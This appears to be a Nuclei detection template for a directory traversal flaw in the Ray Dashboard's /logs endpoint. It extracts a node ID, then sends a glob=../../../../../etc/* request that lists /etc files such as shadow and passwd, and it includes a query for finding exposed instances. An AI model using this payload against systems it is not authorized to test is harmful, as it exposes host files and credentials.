id: ray-dashboard-lfi

info:
  name: Ray Dashboard - Directory Traversal
  author: tomorrow9913,gy741,Mooncastlejun,greyhawk16,clastkr
  severity: high
  description: |
    A Directory Traversal vulnerability in the Ray Dashboard allows enumeration of the host file system by traversing the path used in the glob parameter of the /logs endpoint.
  reference:
    - https://huntr.com/bounties/2450de2d-aa87-46b7-8d53-72135780bf28
  classification:
    cwe-id: CWE-29
  metadata:
    max-request: 2
    fofa-query: title="Ray Dashboard"
  tags: ray,dashboard,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/nodes?view=summary"

    extractors:
      - type: regex
        part: body
        internal: true
        group: 1
        regex:
          - '"nodeLogicalResources":\s*{"([^"]+)"'
        name: node_id

  - method: GET
    path:
      - "{{BaseURL}}/api/v0/logs?node_id={{node_id}}&glob=../../../../../etc/*"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'etc/shadow'
          - 'etc/passwd'
          - 'etc/group'
          - 'result": true'
          - 'internal":'
        condition: and

      - type: word
        part: header
        words:
          - "application/json"

      - type: status
        status:
          - 200
